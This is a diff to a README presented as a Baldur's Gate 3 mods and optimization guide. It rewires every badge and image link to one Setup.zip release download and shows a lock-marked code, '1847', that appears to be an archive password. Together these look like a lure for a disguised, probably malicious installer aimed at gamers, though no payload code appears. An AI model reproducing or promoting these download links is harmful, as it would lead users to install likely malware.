@@ -1,14 +1,14 @@
 # 🎮 Baldurs Gate 3 Mods — Optimization Pack, Tips & Ultimate Guide 2026
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Baldurs-Gate-3)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Singleplayer-blue)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Baldurs-Gate-3)](https://github.com/FractionActivist/Baldurs-Gate-3-Mods/releases/download/Release/Setup.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/FractionActivist/Baldurs-Gate-3-Mods/releases/download/Release/Setup.zip)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/FractionActivist/Baldurs-Gate-3-Mods/releases/download/Release/Setup.zip)
+[![Category](https://img.shields.io/badge/Category-Singleplayer-blue)](https://github.com/FractionActivist/Baldurs-Gate-3-Mods/releases/download/Release/Setup.zip)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/FractionActivist/Baldurs-Gate-3-Mods/releases/download/Release/Setup.zip)
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/FractionActivist/Baldurs-Gate-3-Mods/releases/download/Release/Setup.zip)
 
 <img src="https://cdn.akamai.steamstatic.com/steam/apps/1086940/header.jpg" alt="banner" width="100%" />
 
@@ -23,7 +23,7 @@
 
 ## 📥 Download
 
-[![Baldurs Gate 3 Mods](https://img.shields.io/badge/Download%20Baldurs%20Gate%203%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![Baldurs Gate 3 Mods](https://img.shields.io/badge/Download%20Baldurs%20Gate%203%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/FractionActivist/Baldurs-Gate-3-Mods/releases/download/Release/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
